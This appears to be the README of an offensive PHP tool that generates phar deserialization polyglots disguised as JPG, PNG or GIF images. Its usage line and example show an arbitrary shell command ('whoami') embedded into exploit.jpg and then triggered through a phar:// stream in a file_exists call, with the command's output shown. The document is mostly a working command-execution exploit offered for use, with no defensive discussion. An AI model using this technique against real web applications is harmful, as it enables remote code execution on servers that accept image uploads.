# phar_polyglot
Generate phar polyglot for jpg, png and gif

# Usage
```
Usage: php -c php.ini phar_polyglot.php <command> [jpg|png|gif]
```

# Example
```
php -c php.ini phar_polyglot.php whoami jpg
[+] Polyglot erfolgreich erstellt: exploit.jpg

[+] Lokaler Test (triggert den Exploit):
php -r 'file_exists("phar://exploit.jpg/test.txt");'
kali
```
